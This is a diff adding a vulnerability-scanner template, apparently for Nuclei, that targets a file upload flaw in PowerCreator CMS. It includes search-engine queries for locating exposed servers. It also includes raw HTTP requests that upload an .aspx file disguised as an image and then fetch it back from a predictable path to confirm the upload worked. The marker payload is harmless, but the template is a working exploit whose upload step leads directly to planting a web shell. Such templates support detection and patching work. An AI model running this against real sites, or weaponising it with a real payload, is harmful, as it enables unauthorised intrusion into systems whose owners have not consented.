@@ -1,0 +1,47 @@
+id: PowerCreator-CMS_UploadResourcePic_Fileupload
+
+info:
+  name: PowerCreator-CMS_UploadResourcePic_Fileupload
+  author: HK
+  severity: critical
+  description: PowerCreator-CMS框架/upload/UploadResourcePic.ashx接口存在文件上传漏洞
+  metadata:
+    max-request: 2
+    Fofa-query: body="/GetDataForAjax/GetCheckResourceOpenUrl.aspx"
+    Hunter-query: body="/GetDataForAjax/GetCheckResourceOpenUrl.aspx"
+    Quake-query: body="/GetDataForAjax/GetCheckResourceOpenUrl.aspx"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1517.3.1 Ddg/17.3.1
+    Connection: close
+    Content-Disposition: form-data;name="file1";filename="poc.aspx";
+    Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+    Accept-Encoding: gzip, deflate
+    Content-Length: 222
+
+    -----------------------------20873900192357278038549710136
+    Content-Disposition: form-data; name="file1"; filename="111.aspx"
+    Content-Type: image/jpeg
+
+    11111
+    -----------------------------20873900192357278038549710136--
+  - |+
+    @timeout: 30s
+    GET /ResourcePic/ODM4Mg==.ASPX HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  max-redirects: 3
+  cookie-reuse: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - "11111"
